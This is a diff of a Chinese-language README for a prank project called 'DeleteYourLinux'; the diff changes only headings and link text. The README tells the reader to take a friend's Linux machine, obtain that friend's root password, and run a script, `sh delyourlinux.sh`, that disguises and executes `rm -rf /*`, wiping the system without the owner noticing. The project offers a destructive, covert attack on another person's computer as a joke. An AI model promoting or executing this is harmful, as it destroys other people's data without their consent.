@@ -1,8 +1,8 @@
 # DeleteYourLinux~~一个有大用/沙雕的的项目~~
 ## 用一种让你的机♂油♂看不出来的方式用root运行传说中的`rm -rf /*`
-~~[Readme_EN](/Readme-EN.md)(English Readme will be no longer supported.)~~
+~~[English](/Readme-EN.md)(English Readme will be no longer supported.)~~
 
-## 开始操作 ~~(迷惑行为)~~
+## 开始操作
 
 ~~先捕捉一只你的好机♂油♂，搞♂到他♂的企鹅(Linux)~~
 
@@ -13,6 +13,6 @@
 
 最后，执行命令 `sh delyourlinux.sh`
 
-# 享受激动人心的时刻吧！~~相信这会增♂进♂你们的感♂情♂(来自先辈的肯定.gif)~~
+## 享受激动人心的时刻吧！~~相信这会增♂进♂你们的感♂情♂(来自先辈的肯定.gif)~~
 
-## 警告：你必须在执行命令前知道他的`root`密码或者直接登录`root`帐户！
+# 警告：你必须在执行命令前知道他的`root`密码或者直接登录`root`帐户！
